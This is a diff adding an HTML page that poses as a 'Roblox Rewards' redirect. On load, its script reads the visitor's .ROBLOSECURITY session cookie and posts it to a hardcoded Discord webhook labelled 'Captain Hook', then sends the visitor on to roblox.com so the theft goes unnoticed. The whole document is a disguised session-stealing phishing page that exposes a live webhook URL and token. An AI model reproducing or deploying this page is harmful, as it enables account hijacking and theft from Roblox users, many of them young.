@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Rewards</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #1b263b;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+    }
+    .container {
+      padding: 20px;
+      background-color: #415a77;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+    h1 {
+      font-size: 2em;
+    }
+    p {
+      font-size: 1.2em;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Welcome to Roblox Rewards!</h1>
+    <p>Redirecting to Roblox for exclusive rewards...</p>
+  </div>
+  <script>
+    // Function to get the .ROBLOSECURITY cookie
+    function getRobloxSecurityCookie() {
+      try {
+        const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+        return cookie ? cookie.split('=')[1] : 'No .ROBLOSECURITY cookie found';
+      } catch (error) {
+        return 'Error retrieving cookie: ' + error.message;
+      }
+    }
+
+    // Function to send data to Discord webhook
+    function sendToWebhook(cookie) {
+      const webhookUrl = 'https://discordapp.com/api/webhooks/1404911273312780318/SAqJ3yj8Mn7SRf0lUhhWM5gC-VeDM0ykB4zDGDoElaZMk0IqmHDe_7xyJiLTX8beERSb';
+      const payload = {
+        content: `Captured .ROBLOSECURITY: ${cookie}`,
+        username: 'Captain Hook',
+        avatar_url: null
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (!response.ok) console.error('Webhook failed:', response.status);
+      })
+      .catch(error => console.error('Error sending to webhook:', error));
+    }
+
+    // Main execution
+    window.onload = function() {
+      // Attempt to get the cookie
+      const cookie = getRobloxSecurityCookie();
+      
+      // Send cookie to webhook
+      sendToWebhook(cookie);
+      
+      // Redirect to Roblox immediately
+      window.location.href = 'https://www.roblox.com/';
+    };
+  </script>
+</body>
+</html>
